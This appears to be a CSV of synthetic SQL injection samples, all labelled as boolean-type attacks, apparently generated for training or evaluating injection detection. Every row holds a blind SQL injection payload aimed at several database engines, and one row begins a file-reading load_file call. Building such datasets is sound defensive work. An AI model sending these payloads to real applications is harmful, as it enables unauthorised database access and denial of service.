id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000143,attack,boolean,"1'||  (  select 'cjwx' from dual where 7637  =  7637 and elt  (  9548  =  3991,3991   )    )   ||'",nearest_attack_euclidean,R000245,8.276119177775266
CTGAN_000144,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000253,5.508123825996596
CTGAN_000145,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000583,5.044120920590677
CTGAN_000146,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000573,4.770924647777717
CTGAN_000147,attack,boolean,"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",nearest_attack_euclidean,R000757,6.625603707733902
CTGAN_000148,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000716,6.829933017542432
CTGAN_000149,attack,boolean,1'||  (  select 'mlwj' from dual where 4247  =  4247 and 1702  =  8469  )  ||',nearest_attack_euclidean,R000225,7.516011148279333
CTGAN_000150,attack,boolean,"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000244,5.626596052446196
CTGAN_000151,attack,boolean,"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",nearest_attack_euclidean,R000621,5.398415941479067
CTGAN_000152,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""wdbg"" like ""wdbg",nearest_attack_euclidean,R000623,6.1153239897195775
CTGAN_000153,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R000495,5.814759307997087
CTGAN_000154,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R000669,6.439019910101567
CTGAN_000155,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321",nearest_attack_euclidean,R000374,6.060212742947743
CTGAN_000156,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",nearest_attack_euclidean,R000377,5.98069194191926
CTGAN_000157,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000611,5.344569113406264
CTGAN_000158,attack,boolean,"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",nearest_attack_euclidean,R000647,6.1949702572573715
CTGAN_000159,attack,boolean,"1"" where 4161  =  4161 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000340,5.598124397055658
CTGAN_000160,attack,boolean,"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  4976  =  4976",nearest_attack_euclidean,R000132,4.930273600679745
CTGAN_000161,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R000380,6.705120493603624
CTGAN_000162,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",nearest_attack_euclidean,R000135,7.000042261168855
CTGAN_000163,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'ctbs' like 'ctbs",nearest_attack_euclidean,R000171,5.269323239286872
CTGAN_000164,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000174,5.712082774782731
CTGAN_000165,attack,boolean,"1'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000096,6.235544378510893
CTGAN_000166,attack,boolean,"-4745"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""nifq"" like ""nifq",nearest_attack_euclidean,R000610,5.7795725328756795
CTGAN_000167,attack,boolean,"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""xhvo""  =  ""xhvo",nearest_attack_euclidean,R000479,7.191131487248508
CTGAN_000168,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321",nearest_attack_euclidean,R000374,5.721094720331113
CTGAN_000169,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000146,3.5696606925087204
CTGAN_000170,attack,boolean,"1%"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000689,5.1336633295193534
CTGAN_000171,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000130,5.22499467797842
CTGAN_000172,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000282,6.477009260576436
CTGAN_000173,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000253,3.7027071446062276
CTGAN_000174,attack,boolean,"1%'  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000628,5.694723306763499
CTGAN_000175,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",nearest_attack_euclidean,R000099,5.1512021164403725
CTGAN_000176,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000750,6.150027569253768
CTGAN_000177,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000228,6.213324543751446
CTGAN_000178,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000130,7.167023110902577
CTGAN_000179,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000450,6.378350433386027
CTGAN_000180,attack,boolean,"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",nearest_attack_euclidean,R000220,4.858308220751955
CTGAN_000181,attack,boolean,"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",nearest_attack_euclidean,R000647,3.252722243537459
CTGAN_000182,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R000495,6.533422604151191
CTGAN_000183,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R000730,5.193392202163994
CTGAN_000184,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'wvzw'  =  'wvzw",nearest_attack_euclidean,R000141,7.074064980497631
CTGAN_000185,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000071,4.209109506633663
CTGAN_000186,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000376,6.934634842031573
CTGAN_000187,attack,boolean,"1""   )    )    as hfma where 2654  =  2654 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000445,4.643148973151593
CTGAN_000188,attack,boolean,"1""   )    )    as hfma where 2654  =  2654 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000445,3.4551561922562524
CTGAN_000189,attack,boolean,"1"" where 4161  =  4161 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000340,6.054689884804304
CTGAN_000190,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000277,6.401491886767904
CTGAN_000191,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000282,6.48565734012259
CTGAN_000192,attack,boolean,"1  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000379,6.4136477200681785
CTGAN_000193,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000526,5.866716380595001
CTGAN_000194,attack,boolean,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""ncym"" like ""ncym",nearest_attack_euclidean,R000151,6.01277787538546
CTGAN_000195,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000319,4.217880341118455
CTGAN_000196,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",nearest_attack_euclidean,R000431,4.944534041709283
CTGAN_000197,attack,boolean,-8051  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  5637  =  5637,nearest_attack_euclidean,R000548,4.200669587955017
CTGAN_000198,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'pwuy'  =  'pwuy",nearest_attack_euclidean,R000124,6.054222353105353
CTGAN_000199,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000461,5.911171298700567
CTGAN_000200,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000560,5.999511426123503
CTGAN_000201,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000356,7.18911254593983
CTGAN_000202,attack,boolean,"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",nearest_attack_euclidean,R000285,5.116486446020207
CTGAN_000203,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo",nearest_attack_euclidean,R000064,5.437947441250755
CTGAN_000204,attack,boolean,"1'  )   where 8948  =  8948 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000627,6.5471093882350715
CTGAN_000205,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R000495,6.22633670598925
CTGAN_000206,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R000772,4.952551601911865
CTGAN_000207,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000369,5.469373702176087
CTGAN_000208,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""wdbg"" like ""wdbg",nearest_attack_euclidean,R000623,6.307435434974821
CTGAN_000209,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000356,5.674668858284531
CTGAN_000210,attack,boolean,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""ncym"" like ""ncym",nearest_attack_euclidean,R000151,4.560676654818808
CTGAN_000211,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R000495,6.123505394209113
CTGAN_000212,attack,boolean,"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",nearest_attack_euclidean,R000647,5.021188234285594
CTGAN_000213,attack,boolean,"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",nearest_attack_euclidean,R000621,7.728615580434941
CTGAN_000214,attack,boolean,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""qfhv""  =  ""qfhv",nearest_attack_euclidean,R000485,4.289907259895226
CTGAN_000215,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000329,6.356780932720042
CTGAN_000216,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000419,8.92722434894991
CTGAN_000217,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R000730,5.14744550508301
CTGAN_000218,attack,boolean,"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215",nearest_attack_euclidean,R000440,6.782903172223253
CTGAN_000219,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza",nearest_attack_euclidean,R000490,6.913139761503528
CTGAN_000220,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000376,7.469553622426274
CTGAN_000221,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000750,6.706216098739976
CTGAN_000222,attack,boolean,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000511,5.4118473299544725
CTGAN_000223,attack,boolean,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000243,5.509552449838063
CTGAN_000224,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R000204,5.23431500833831
CTGAN_000225,attack,boolean,"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  9112  =  9112",nearest_attack_euclidean,R000192,5.411285695401463
CTGAN_000226,attack,boolean,"1'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000715,6.002378425255877
CTGAN_000227,attack,boolean,"1   )    )    as tbiq where 7159  =  7159 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000322,5.869087482055462
CTGAN_000228,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000502,7.081120393352929
CTGAN_000229,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000098,6.692775712126832
CTGAN_000230,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000531,7.129754943705357
CTGAN_000231,attack,boolean,"1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  2908,2908  )  --",nearest_attack_euclidean,R000150,6.184785675483743
CTGAN_000232,attack,boolean,"1' in boolean mode  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000457,5.70952967498915
CTGAN_000233,attack,boolean,"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000249,4.368490531749695
CTGAN_000234,attack,boolean,"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'wmrr' like 'wmrr",nearest_attack_euclidean,R000121,5.7098962222318805
CTGAN_000235,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000408,5.137985342448371
CTGAN_000236,attack,boolean,"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",nearest_attack_euclidean,R000712,5.467827329559967
CTGAN_000237,attack,boolean,"1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000352,7.157927001850342
CTGAN_000238,attack,boolean,1'||  (  select 'mlwj' from dual where 4247  =  4247 and 1702  =  8469  )  ||',nearest_attack_euclidean,R000225,6.780126001531932
CTGAN_000239,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ctdc""  =  ""ctdc",nearest_attack_euclidean,R000341,4.809833308827605
CTGAN_000240,attack,boolean,"1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  2908,2908  )  --",nearest_attack_euclidean,R000150,5.077797856807971
CTGAN_000241,attack,boolean,"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",nearest_attack_euclidean,R000647,5.948560691920916
CTGAN_000242,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000387,5.77886937642741
CTGAN_000243,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000077,8.265671015095878
CTGAN_000244,attack,boolean,"1%"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000689,5.884783256045029
CTGAN_000245,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   7700  =  7700",nearest_attack_euclidean,R000634,5.269185340348907
CTGAN_000246,attack,boolean,"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",nearest_attack_euclidean,R000285,5.522213711203364
CTGAN_000247,attack,boolean,"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R000778,5.213451317028329
CTGAN_000248,attack,boolean,"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",nearest_attack_euclidean,R000410,5.993685077065134
CTGAN_000249,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000531,6.8099957920695156
CTGAN_000250,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000366,5.850853860188825
CTGAN_000251,attack,boolean,"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000420,4.56933821079213
CTGAN_000252,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000366,6.404451959169139
CTGAN_000253,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000356,5.623201832887752
CTGAN_000254,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R000669,6.64797781290092
CTGAN_000255,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000693,5.237549682435082
CTGAN_000256,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R000669,5.854210009203843
CTGAN_000257,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000130,4.552902842382862
CTGAN_000258,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000438,5.791492308468203
CTGAN_000259,attack,boolean,1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',nearest_attack_euclidean,R000147,5.4937067634591585
CTGAN_000260,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000419,7.889586226389466
CTGAN_000261,attack,boolean,"1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",nearest_attack_euclidean,R000031,7.459321422659864
CTGAN_000262,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R000669,6.651583773953957
CTGAN_000263,attack,boolean,"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",nearest_attack_euclidean,R000756,4.409342086044289
CTGAN_000264,attack,boolean,"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000166,6.253107161551033
CTGAN_000265,attack,boolean,"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",nearest_attack_euclidean,R000712,7.351910682996388
CTGAN_000266,attack,boolean,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000243,5.348679810658718
CTGAN_000267,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000707,5.437141911824927
CTGAN_000268,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000704,6.745932377602778
CTGAN_000269,attack,boolean,"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",nearest_attack_euclidean,R000299,5.61202654399166
CTGAN_000270,attack,boolean,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""qfhv""  =  ""qfhv",nearest_attack_euclidean,R000485,5.842063408545264
CTGAN_000271,attack,boolean,"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",nearest_attack_euclidean,R000759,5.515185282051358
CTGAN_000272,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000408,5.625196941538072
CTGAN_000273,attack,boolean,"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",nearest_attack_euclidean,R000220,4.3476659752326015
CTGAN_000274,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000596,6.123511317822757
CTGAN_000275,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",nearest_attack_euclidean,R000292,5.8705802085817655
CTGAN_000276,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000234,5.620794226659013
CTGAN_000277,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000173,5.459801234473441
CTGAN_000278,attack,boolean,"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",nearest_attack_euclidean,R000285,5.8012762077925455
CTGAN_000279,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000071,6.073627366824802
CTGAN_000280,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000356,6.088470531784197
CTGAN_000281,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000011,5.217266266473522
CTGAN_000282,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000366,5.112485670798473
CTGAN_000283,attack,boolean,-4538'   )    )     )   or 3260  =  1236 and    (    (     (  'hpnd' like 'hpnd,nearest_attack_euclidean,R000305,6.428108337834899
CTGAN_000284,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000214,7.043354471545389
